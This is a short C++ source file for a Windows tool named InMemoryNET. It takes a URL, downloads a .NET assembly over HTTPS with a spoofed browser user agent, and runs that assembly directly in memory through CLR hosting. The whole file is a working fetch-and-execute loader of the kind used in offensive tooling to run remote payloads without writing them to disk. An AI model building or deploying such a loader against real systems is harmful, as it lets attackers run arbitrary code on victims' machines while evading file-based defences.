#include <fstream>
#include <vector>
#include <sstream>
#include <Windows.h>
#include "stdlib.hpp"
#include "CLR.hpp"
#include "winhttp.hpp"

std::string read_string_from_file(const std::string& file_path) {
    const std::ifstream input_stream(file_path, std::ios_base::binary);

    if (input_stream.fail()) {
        throw std::runtime_error("Failed to open file");
    }

    std::stringstream buffer;
    buffer << input_stream.rdbuf();

    return buffer.str();
}

std::vector<unsigned char> DownloadFileA(std::string url)
{
    std::string endpoint = stdlib::SplitAndGetSubstringA(url, '/', 3);
    std::string server = stdlib::RemoveSubstringA(url, "https://");
    server = stdlib::RemoveSubstringA(server, endpoint);

    zzWinHttp::request_data rd;
    std::vector<unsigned char> data;

    rd.pwsServerName = stdlib::StringA2StringW(server);
    rd.nServerPort = INTERNET_DEFAULT_HTTPS_PORT;
    rd.pwsVerb = L"GET";
    rd.pwsObjectName = stdlib::StringA2StringW(endpoint);
    rd.pwsUserAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";;
    rd.pwszVersion = L"HTTP/1.1";
    rd.pwszReferrer = L"";
    rd.ppwszAcceptTypes = L"";
    rd.lpszHeaders = L"";
    rd.lpwsData = L"";
    rd.bSSL = TRUE;
    rd.bAutoProxy = TRUE;

    zzWinHttp::Request* r = new zzWinHttp::Request(rd);

    r->send(data);

    delete r;

    return data;
}

int main(int argc, char* argv[])
{
    printf(" ~ InMemoryNET ~\n");
    std::string url = "";
    std::string args = "";

    if (argc != 3)
    {
        printf("%s <url> <assembly args>\n", argv[0]);
        return -1;
    }
    else
    {
        url = argv[1];
        args = argv[2];
    }

    std::vector<unsigned char> bytes = DownloadFileA(url);

    if (bytes.empty())
    {
        return -1;
    }
    printf("[+] Bytes: %ld\n", bytes.size());

    CLRManager::CLR clr = CLRManager::CLR();
    clr.execute_assembly(bytes, args);

    return 0;
}